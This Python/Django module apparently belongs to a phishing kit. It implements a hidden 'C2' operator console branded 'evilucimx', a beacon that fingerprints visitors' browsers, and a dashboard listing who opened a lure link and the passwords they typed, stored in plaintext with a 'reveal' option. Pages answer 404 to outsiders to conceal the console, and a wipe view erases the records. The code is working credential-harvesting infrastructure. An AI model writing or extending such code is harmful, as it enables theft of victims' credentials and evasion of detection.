"""Visit telemetry and the operator dashboard.

Kept separate from views.py so the additions are reviewable on their own
and survive a pull from upstream.

Two things live here:

  * the beacon endpoint the landing page posts browser details to
  * a dashboard to read it all on, built for a projector rather than for
    administration

Recording the visit itself is VisitMiddleware's job.
"""
import json

import os
import secrets
from functools import wraps

from django.http import (HttpResponseForbidden, HttpResponseNotFound,
                         JsonResponse)
from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt

from django.contrib.auth.hashers import check_password, make_password

from .models import SignIn, Setting, Visit
from .utils import read_ua, visitor_id  # noqa: F401

PASSWORD_KEY = 'c2_password'


def brand():
    """Whose console this is. Shown on the way in."""
    return os.environ.get('BRAND', 'evilucimx')


def default_password():
    """The one from the environment. Works until you set your own."""
    return os.environ.get('C2_PASSWORD', 'admin')


def stored_hash():
    row = Setting.objects.filter(key=PASSWORD_KEY).first()
    return row.value if row and row.value else ''


def using_default():
    return not stored_hash()


def password_ok(candidate):
    """Check against the password you set, or the default if you have not."""
    saved = stored_hash()
    if saved:
        return check_password(candidate, saved)
    # Constant-time, so a wrong guess does not leak where it diverged.
    return secrets.compare_digest(str(candidate), default_password())


def set_password(new):
    Setting.objects.update_or_create(
        key=PASSWORD_KEY, defaults={'value': make_password(new)})


def signed_in(request):
    return bool(request.session.get('c2_ok'))


def require_c2(view):
    """One password, one page.

    The Django admin is not mounted at all, so there are no user accounts,
    no groups and no permissions to wade through - just this.

    Signed out, every protected page answers 404 rather than offering a
    login. Nothing confirms there is anything here to find.
    """
    @wraps(view)
    def wrapped(request, *args, **kwargs):
        if not signed_in(request):
            return HttpResponseNotFound('Not Found')
        return view(request, *args, **kwargs)
    return wrapped


@csrf_exempt
def collect(request):
    """The beacon the page fires on load.

    Adds what the browser volunteers to any script that asks - screen,
    timezone, cores, memory - to the row the server already wrote.

    CSRF-exempt because sendBeacon cannot carry a token. It can only
    write to the visit matching the caller's own cookie, so the worst a
    forged call does is overwrite its own row.
    """
    if request.method != 'POST':
        return HttpResponseForbidden('POST only')

    vid = request.COOKIES.get('vid', '')
    if not (len(vid) == 24 and vid.isalnum()):
        return JsonResponse({'ok': False}, status=200)

    try:
        data = json.loads((request.body or b'{}').decode('utf-8'))
    except (ValueError, UnicodeDecodeError):
        return JsonResponse({'ok': False}, status=400)
    if not isinstance(data, dict):
        return JsonResponse({'ok': False}, status=400)

    fields = {}
    for key, size in (('screen', 24), ('window', 24), ('timezone', 64),
                      ('languages', 120), ('cores', 8), ('memory', 8),
                      ('platform', 48), ('touch', 8)):
        value = data.get(key)
        if value is not None and not isinstance(value, (dict, list)):
            fields[key] = str(value)[:size]

    if fields:
        visit = Visit.objects.filter(vid=vid).order_by('-created').first()
        if visit:
            for k, v in fields.items():
                setattr(visit, k, v)
            visit.save(update_fields=list(fields))

    return JsonResponse({'ok': True})


def _mask(value):
    """Nothing of the value survives, not even the first character.

    A first letter plus a length is a real head start on guessing the
    rest, and a projector is the worst place to hand that out.
    """
    if not value:
        return ''
    return '•' * min(len(value), 12) + f' ({len(value)})'


@require_c2
def collector(request):
    """Two panels: who opened the link, and who went on to type."""
    reveal = 'reveal' in request.GET

    visits = list(Visit.objects.all()[:80])
    signins = list(SignIn.objects.all()[:80])

    for s in signins:
        s.shown = s.password if reveal else _mask(s.password)
        s.browser_os = f'{s.browser} / {s.os}' if s.browser else '-'

    # Docker Desktop rewrites the source address of forwarded
    # connections, so on a laptop every visitor arrives as the bridge
    # gateway. Behind Caddy on the droplet the real address comes through
    # in X-Forwarded-For. Say which one is happening rather than let it
    # look like a bug.
    recent = [v.client_ip for v in visits[:10]]
    nat = bool(recent) and all(ip.startswith(('172.17.', '172.18.', '172.19.'))
                               for ip in recent)

    return render(request, 'collector.html', {
        'brand': brand(),
        'nat': nat,
        'using_default': using_default(),
        'visits':       visits,
        'signins':      signins,
        'visit_count':  Visit.objects.count(),
        'signin_count': SignIn.objects.count(),
        'reveal':       reveal,
    })


@require_c2
def wipe(request):
    Visit.objects.all().delete()
    SignIn.objects.all().delete()
    return redirect('collector')


def gate(request):
    """The way in. Shows the sign-in form, or the collector once past it."""
    if request.GET.get('logout') is not None:
        request.session.flush()
        return redirect('gate')

    bad = False
    if request.method == 'POST':
        # Constant-time, so the answer does not leak a character at a time.
        if password_ok(request.POST.get('password', '')):
            request.session.cycle_key()
            request.session['c2_ok'] = True
            return redirect('collector')
        bad = True

    if signed_in(request):
        return redirect('collector')

    response = render(request, 'collector_login.html',
                      {'bad': bad, 'brand': brand()})
    response.status_code = 403 if bad else 404
    return response


@require_c2
def change_password(request):
    """Set your own password, from the browser, while signed in."""
    error = note = ''

    if request.method == 'POST':
        current = request.POST.get('current', '')
        new = request.POST.get('new', '')
        again = request.POST.get('again', '')

        if not password_ok(current):
            error = 'that is not the current password'
        elif len(new) < 8:
            error = 'use at least 8 characters'
        elif new != again:
            error = 'the two new passwords do not match'
        elif new == default_password():
            error = 'that is still the default'
        else:
            set_password(new)
            # Everything else signed in with the old one stops being valid.
            request.session.cycle_key()
            request.session['c2_ok'] = True
            note = 'changed'

    return render(request, 'collector_password.html', {
        'brand': brand(), 'error': error, 'note': note,
        'using_default': using_default(),
    })
